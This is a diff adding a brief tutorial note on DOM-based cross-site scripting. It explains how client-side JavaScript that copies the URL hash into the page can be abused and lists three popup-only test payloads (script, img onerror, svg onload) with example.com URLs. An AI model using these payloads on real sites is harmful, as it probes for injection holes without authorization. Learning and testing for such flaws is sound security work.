@@ -1,0 +1,27 @@
+DOM XSS
+DOM XSS happens when the JavaScript on the page takes data from the URL
+and injects it directly into the page using the DOM, not server-side.
+
+This type doesn’t need the server to reflect anything 
+the client-side JavaScript does the damage.
+
+It runs when the browser loads the page and executes JS that trusts user input.
+
+Example Payloads:
+
+#<script>alert(1)</script>
+#"><img src=x onerror=alert('dom')>
+#"><svg/onload=confirm(777)>
+ 
+Example URLs:
+https://example.com/page.html#<script>alert(1)</script>
+https://example.com/page.html#"><img src=x onerror=alert('dom')>
+https://example.com/page.html#"><svg/onload=confirm(777)>
+What They Do:
+First one runs a popup if JS on the page injects the hash into the DOM.
+
+Second one fires a popup through image error if inserted into innerHTML or similar.
+
+Third one abuses SVG tag loading if the site copies hash content into the DOM.
+
+SVG tag is an image tag that can run JavaScript events.
